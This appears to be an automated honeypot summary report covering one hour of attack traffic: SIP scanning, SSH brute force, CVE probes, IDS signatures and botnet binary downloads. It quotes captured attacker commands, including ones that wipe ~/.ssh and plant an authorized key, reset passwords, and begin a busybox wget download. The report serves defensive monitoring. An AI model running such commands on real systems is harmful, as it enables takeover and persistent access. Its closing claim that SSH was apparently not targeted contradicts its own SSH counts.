
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-01T19:01:36Z
**Timeframe:** 2025-10-01T18:20:01Z to 2025-10-01T19:00:01Z
**Files Used:**
- agg_log_20251001T182001Z.json
- agg_log_20251001T184002Z.json
- agg_log_20251001T190001Z.json

---

## Executive Summary

This report summarizes 29,991 events collected from the honeypot network over the last hour. The majority of the traffic was SIP scanning, with Sentrypeer logging 19,264 events. The most active IP address was 92.205.59.208, which was responsible for 19,335 events. A number of CVEs were targeted, including CVE-2002-0013 and CVE-2019-11500. Attackers attempted to download and execute malicious shell scripts and ELF binaries, as seen in the commands and file download sections. A large number of brute force attempts were also observed.

---

## Detailed Analysis

### Attacks by Honeypot

- Sentrypeer: 19,264
- Cowrie: 6,685
- Honeytrap: 1,391
- Suricata: 902
- Ciscoasa: 709
- Dionaea: 242
- Mailoney: 590
- H0neytr4p: 54
- Tanner: 64
- Redishoneypot: 45
- Adbhoney: 18
- Honeyaml: 8
- ConPot: 4
- ElasticPot: 4
- Miniprint: 9
- ssh-rsa: 2

### Top Attacking IPs

- 92.205.59.208: 19,335
- 103.130.215.15: 2,921
- 134.199.196.246: 1,282
- 134.199.205.246: 1,251
- 88.210.63.16: 192
- 185.156.73.167: 180
- 185.156.73.166: 180
- 92.63.197.55: 175
- 92.63.197.59: 161
- 203.92.41.37: 201
- 168.167.228.74: 103
- 221.226.17.34: 115
- 101.36.119.50: 80
- 14.29.181.34: 83
- 118.194.229.182: 84
- 27.112.78.170: 71
- 74.225.152.15: 65
- 196.251.69.107: 22
- 196.251.70.234: 31
- 188.246.224.87: 36

### Top Targeted Ports/Protocols

- 5060: 19,264
- 22: 1,273
- 445: 205
- UDP/5060: 91
- 80: 62
- 25: 590
- 443: 47
- 6379: 45
- 8333: 49
- 23: 29
- TCP/22: 28
- TCP/80: 16
- 2222: 16
- 3333: 12
- 1433: 11
- 4444: 11
- 55555: 11
- 10000: 11
- 4433: 16
- 8728: 16

### Most Common CVEs

- CVE-2002-0013 CVE-2002-0012
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
- CVE-2019-11500 CVE-2019-11500

### Commands Attempted by Attackers

- `cd ~; chattr -ia .ssh; lockr -ia .ssh`: 7
- `lockr -ia .ssh`: 7
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa ...\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`: 6
- `cat /proc/cpuinfo | grep name | wc -l`: 6
- `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'`: 6
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`: 6
- `ls -lh $(which ls)`: 6
- `which ls`: 6
- `crontab -l`: 6
- `uname -m`: 5
- `cat /proc/cpuinfo | grep model | grep name | wc -l`: 5
- `top`: 5
- `uname`: 5
- `uname -a`: 5
- `w`: 5
- `whoami`: 4
- `lscpu | grep Model`: 4
- `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`: 4
- `Enter new UNIX password: `: 3
- `Enter new UNIX password:`: 3
- `uname -s -v -n -r -m`: 2
- `cd /data/local/tmp/; rm *; busybox wget ...`: 1
- `echo -e \"jester123\\n79GumKcZkZu0\\n79GumKcZkZu0\"|passwd|bash`: 1
- `echo \"jester123\\n79GumKcZkZu0\\n79GumKcZkZu0\\n\"|passwd`: 1

### Signatures Triggered

- ET SCAN MS Terminal Server Traffic on Non-standard Port: 137
- 2023753: 137
- ET DROP Dshield Block Listed Source group 1: 129
- 2402000: 129
- ET VOIP REGISTER Message Flood UDP: 90
- 2009699: 90
- ET SCAN NMAP -sS window 1024: 83
- 2009582: 83
- ET HUNTING RDP Authentication Bypass Attempt: 59
- 2034857: 59
- ET INFO Reserved Internal IP Traffic: 28
- 2002752: 28
- ET SCAN Potential SSH Scan: 24
- 2001219: 24
- ET CINS Active Threat Intelligence Poor Reputation IP group 48: 14
- 2403347: 14
- ET ATTACK_RESPONSE Possible MS CMD Shell opened on local system: 11
- 2008953: 11

### Users / Login Attempts

- 345gs5662d34/345gs5662d34: 3
- root/aq1sw2: 2
- admin/: 2
- priyanka/priyanka: 2
- nxautomation/nxautomation: 2
- hysteria/hysteria: 2
- steam/steam: 2
- jfletcher/jfletcher: 2
- test1/test1: 2
- mail/mail: 2
- root/12345: 2
- shutdown/shutdown: 2
- zrybs/zrybs: 2
- beaver/beaver: 2
- amrita/amrita: 2
- demo/demo: 2
- foundry/foundry: 2

### Files Uploaded/Downloaded

- arm.urbotnetisass;: 2
- arm.urbotnetisass: 2
- arm5.urbotnetisass;: 2
- arm5.urbotnetisass: 2
- arm6.urbotnetisass;: 2
- arm6.urbotnetisass: 2
- arm7.urbotnetisass;: 2
- arm7.urbotnetisass: 2
- x86_32.urbotnetisass;: 2
- x86_32.urbotnetisass: 2
- mips.urbotnetisass;: 2
- mips.urbotnetisass: 2
- mipsel.urbotnetisass;: 2
- mipsel.urbotnetisass: 2
- wget.sh;: 4
- w.sh;: 1
- c.sh;: 1
- json: 1

### HTTP User-Agents
- N/A

### SSH Clients
- N/A

### SSH Servers
- N/A

### Top Attacker AS Organizations
- N/A

---

## Key Observations and Anomalies

- The overwhelming majority of traffic is SIP scanning directed at port 5060, originating from a single IP address (92.205.59.208).
- Attackers are attempting to download and execute a variety of ELF binaries with the `.urbotnetisass` extension, suggesting a coordinated campaign to deploy a specific malware or botnet.
- A common tactic observed is the attempt to add an SSH key to the `authorized_keys` file for persistent access.
- Several commands related to system information gathering (`uname`, `lscpu`, `free`, `df`) are consistently executed, likely for reconnaissance purposes.
- There are no observed HTTP User-Agents, SSH clients, or server software recorded in these logs, which may indicate that these honeypots were not targeted with HTTP or SSH attacks, or the logging for these fields was not triggered.
